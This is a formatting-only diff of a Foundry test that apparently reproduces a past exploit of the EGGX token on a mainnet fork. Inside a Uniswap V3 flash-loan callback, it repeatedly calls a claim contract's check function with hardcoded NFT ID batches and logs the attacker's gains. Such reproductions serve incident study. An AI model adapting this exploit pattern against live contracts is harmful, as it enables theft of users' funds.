@@ -19,26 +19,27 @@ interface IEGGXUNIV3POOL {
         uint160 sqrtPriceLimitX96,
         bytes calldata data
     ) external;
-    function flash(
-        address recipient,
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) external;
+    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
 }
 
-interface IEGGX is IERC20{
+interface IEGGX is IERC20 {
     function transfer(address to, uint256 value) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
+    function balanceOf(
+        address account
+    ) external view returns (uint256);
     function minted() external view returns (uint256);
-    function tokenURI(uint256 id) external view returns (string memory);
+    function tokenURI(
+        uint256 id
+    ) external view returns (string memory);
 }
 
 interface IEGGXClaim {
-    function check(uint256[] memory) external;
+    function check(
+        uint256[] memory
+    ) external;
 }
 
-interface IWeth is IERC20{
+interface IWeth is IERC20 {
     function deposit() external payable;
 }
 
@@ -51,7 +52,7 @@ contract ContractTest is Test {
 
     function setUp() public {
         // evm_version Requires to be "shanghai"
-        cheats.createSelectFork("mainnet", 19252567 - 1);
+        cheats.createSelectFork("mainnet", 19_252_567 - 1);
         cheats.label(address(EGGX), "EGGX");
         cheats.label(address(pool), "EGGX_Pool");
         cheats.label(address(WETH), "WETH");
@@ -72,60 +73,56 @@ contract ContractTest is Test {
         emit log_named_uint("Attacker ETH balance after attack:", WETH.balanceOf(address(this)));
     }
 
-    function uniswapV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
-        uint256 pollbalance = abi.decode(data,(uint256));
+    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
+        uint256 pollbalance = abi.decode(data, (uint256));
         uint256[] memory nftid = new uint256[](6);
 
-        nftid[0] = 30342;
-        nftid[1] = 30319;
-        nftid[2] = 30031;
-        nftid[3] = 30036;
-        nftid[4] = 30028;
-        nftid[5] = 30019;
+        nftid[0] = 30_342;
+        nftid[1] = 30_319;
+        nftid[2] = 30_031;
+        nftid[3] = 30_036;
+        nftid[4] = 30_028;
+        nftid[5] = 30_019;
         EGGXCliam.check(nftid);
 
-        nftid[0] = 30379;
-        nftid[1] = 30363;
-        nftid[2] = 30169;
-        nftid[3] = 30267;
-        nftid[4] = 30098;
-        nftid[5] = 30484;
+        nftid[0] = 30_379;
+        nftid[1] = 30_363;
+        nftid[2] = 30_169;
+        nftid[3] = 30_267;
+        nftid[4] = 30_098;
+        nftid[5] = 30_484;
         EGGXCliam.check(nftid);
 
-        nftid[0] = 30281;
-        nftid[1] = 30217;
-        nftid[2] = 30245;
-        nftid[3] = 30192;
-        nftid[4] = 30027;
-        nftid[5] = 30181;
+        nftid[0] = 30_281;
+        nftid[1] = 30_217;
+        nftid[2] = 30_245;
+        nftid[3] = 30_192;
+        nftid[4] = 30_027;
+        nftid[5] = 30_181;
         EGGXCliam.check(nftid);
 
-        nftid[0] = 30368;
-        nftid[1] = 30488;
-        nftid[2] = 30259;
-        nftid[3] = 30284;
-        nftid[4] = 30084;
-        nftid[5] = 30395;
+        nftid[0] = 30_368;
+        nftid[1] = 30_488;
+        nftid[2] = 30_259;
+        nftid[3] = 30_284;
+        nftid[4] = 30_084;
+        nftid[5] = 30_395;
         EGGXCliam.check(nftid);
 
-        nftid[0] = 30408;
-        nftid[1] = 30111;
-        nftid[2] = 30365;
-        nftid[3] = 30144;
-        nftid[4] = 30176;
-        nftid[5] = 30054;
+        nftid[0] = 30_408;
+        nftid[1] = 30_111;
+        nftid[2] = 30_365;
+        nftid[3] = 30_144;
+        nftid[4] = 30_176;
+        nftid[5] = 30_054;
         EGGXCliam.check(nftid);
 
-        nftid[0] = 30039;
-        nftid[1] = 30045;
-        nftid[2] = 30030;
-        nftid[3] = 30070;
-        nftid[4] = 30055;
-        nftid[5] = 30213;
+        nftid[0] = 30_039;
+        nftid[1] = 30_045;
+        nftid[2] = 30_030;
+        nftid[3] = 30_070;
+        nftid[4] = 30_055;
+        nftid[5] = 30_213;
         EGGXCliam.check(nftid);
 
         emit log_named_uint("Attacker EGGX exploit balance:", EGGX.balanceOf(address(this)));
